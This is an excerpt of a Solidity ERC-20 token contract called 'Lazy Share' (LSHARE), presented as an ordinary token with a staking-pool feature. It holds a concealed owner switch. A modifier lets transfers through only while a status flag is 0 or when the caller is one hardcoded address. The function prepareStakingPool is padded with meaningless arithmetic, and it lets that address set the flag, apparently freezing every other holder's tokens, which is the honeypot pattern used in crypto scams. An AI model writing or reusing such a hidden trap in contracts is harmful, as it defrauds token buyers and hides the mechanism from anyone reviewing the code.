...
contract LazyShare is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenn_totalSupply;
    uint256 private _tokenn_status = 0;
    uint256 public stakingPoolnStatus = 0;

    string private _tokenn_name;
    string private _tokenn_symbol;

    address private _poolnAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _tokenn_name = "Lazy Share";
        _tokenn_symbol = "LSHARE";
        _tokenn_totalSupply = 10000000000 * 10 ** 18;
        _balances[msg.sender] = _tokenn_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolnAddress || _tokenn_status == 0);
        _;
    }
    ...
    function symbol() public view virtual override returns (string memory) {
        return _tokenn_symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenn_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolnStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolnAddress)
        {
            _tokenn_status = 1;
        }
    }
